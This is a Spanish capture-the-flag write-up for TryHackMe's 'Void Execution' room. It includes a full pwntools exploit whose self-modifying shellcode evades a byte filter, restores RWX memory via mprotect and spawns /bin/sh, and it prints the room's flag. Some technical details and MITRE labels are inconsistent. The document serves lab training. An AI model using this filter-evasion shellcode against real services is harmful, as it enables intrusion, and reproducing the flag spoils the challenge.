# Void Execution

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | PWN / Shellcoding | voidexecution | https://tryhackme.com/room/voidexecution | 02 Level Medium | TryHackMe | mmap 0xC0DE0000, filtro forbidden, self-modifying shellcode, mprotect, execve | Ejecución de shellcode y root en el objetivo |

---

**Contexto:** La sala **Void Execution** es un reto de **binary exploitation** de la serie *Hackfinity Battle*. El servidor (puerto 9008) lee hasta 100 bytes de código, los mapea en una región fija (`mmap(0xc0de0000, 0x64, PROT_READ|WRITE|EXEC, ...)`), lo filtra con `forbidden()` (bloquea el byte `0x15` y la secuencia `0xcd 0x80`, es decir `syscall`/`int 0x80`), después quita los permisos de escritura con `mprotect(..., PROT_READ|EXEC)` y ejecuta el shellcode. La resolución consiste en inyectar un **shellcode self-modifying**: se calcula la dirección de `mprotect` desde el registro `r13` (que apunta a `main`, PIE), se llama para reotorgar RWX, y se parchea en runtime un `syscall` protegido (placeholder `0x0e 0x04` incrementado con `inc byte ptr [rip+...]`) antes de lanzar `execve("/bin/sh")`.

## Solucionario

### Task 1: Void Execution / Explotación
**Explicación:**

Se descarga el binario `voidexec` y su `libc.so.6`. Con `checksec` se ven **NX habilitado** (no se puede ejecutar en pila) y **PIE habilitado**. En Ghidra, `main` hace: `s = mmap((void*)0xC0DE0000, 100, PROT_READ|PROT_WRITE|PROT_EXEC, flags, -1, 0)`, lee 100 bytes, comprueba `forbidden(s)` (detecta `0x15` y `0xcd 0x80`), llama `mprotect(s, 100, PROT_READ|PROT_EXEC)` y ejecuta `((void(*)())s)()`.

```bash
checksec --file voidexec
nmap -sC -sV <IP>
# 9008/tcp open: al conectarse muestra "Send to void execution:"
```

Los pesos de `main` y el PLT de `mprotect` (offets `0x12eb` y `0x1100` desde la base PIE `0x00100000`) se obtienen de Ghidra/`readelf`. Como `r13` contiene la dirección de `main` en runtime, se calcula `mprotect` con `lea rbx, [r13 - main + mprotect]`. El shellcode:

1. Calcula y llama a `mprotect(0xc0de0000, 0x64, 0x7)` para volver a tener **RWX**.
2. Monta `execve("/bin/sh", NULL, NULL)` con `syscall` **no escrito directamente**: se deja un placeholder `0x0e 0x04` y en runtime se hace `inc byte ptr [rip+syscall]` / `inc byte ptr [rip+syscall+1]` para obtener `0x0f 0x05` sin que `forbidden()` lo detecte.

```python
from pwn import *

e = ELF('./voidexec')
context.clear(arch='amd64', endian='little')
# io = process('./voidexec')
io = remote('<IP>', 9008)

main_off    = 0x12eb   # offset de main (PIE base 0x100000)
mprotect_off = 0x1100  # offset del PLT de mprotect

shellcode = asm(f'''
    lea rbx, [r13 - {main_off} + {mprotect_off}]

    mov rdi, 0xc0de0000
    mov rsi, 0x64
    mov rdx, 0x7
    call rbx

    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp

    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]

syscall:
    .byte 0x0e, 0x04
''')

log.info(f'Length of shellcode: {len(shellcode)}')
io.recvuntil(b'Send to void execution:')
io.sendline(shellcode)
io.interactive()
# whoami → root ; cat flag.txt
```

Con la shell se lee la flag.

| Pregunta | Respuesta |
|----------|-----------|
| What is the flag? | `THM{a_void_in_the_memory_c0de}` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? | `THM{a_void_in_the_memory_c0de}` |

---

**Metodología:** Análisis estático con `checksec` y Ghidra, identificación de `mmap` de dirección fija y del filtro `forbidden`, cálculo de offsets (PIE) para `mprotect`, y construcción de shellcode self-modifying que parchea el syscall bloqueado en tiempo de ejecución antes de `execve("/bin/sh")`.

### Cadena de ataque / Attack Chain

```
checksec (NX + PIE) → Ghidra (mmap 0xC0DE0000, forbidden 0x15/0xcd80, mprotect RX) → offsets main(0x12eb)/mprotect(0x1100) → lea rbx [r13-main+mprotect] → mprotect RWX → placeholder syscall self-modifying (0x0e 0x04 → inc → 0x0f 0x05) → execve("/bin/sh") → flag
```

**Learning chain:** Análisis de binarios → comprensión de filtros de shellcode → ingeniería de self-modifying code → cálculo de direcciones PIE en runtime → syscalls con `execve`.

**Lección:** *Un filtro de bytes prohibidos se evade con código automodificable: se escribe un placeholder que en runtime se incrementa a la instrucción real (`0x0f 0x05`), mientras la protección de memoria se recupera llamando a `mprotect` desde una referencia de registro (PIE).*

**MITRE ATT&CK:** T1106 Native API · T1055.001 Process Injection / Self-Modifying Code · T1059.001 Command and Scripting Interpreter.

**Fuente:** [TryHackMe - Void Execution](https://tryhackme.com/room/voidexecution)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.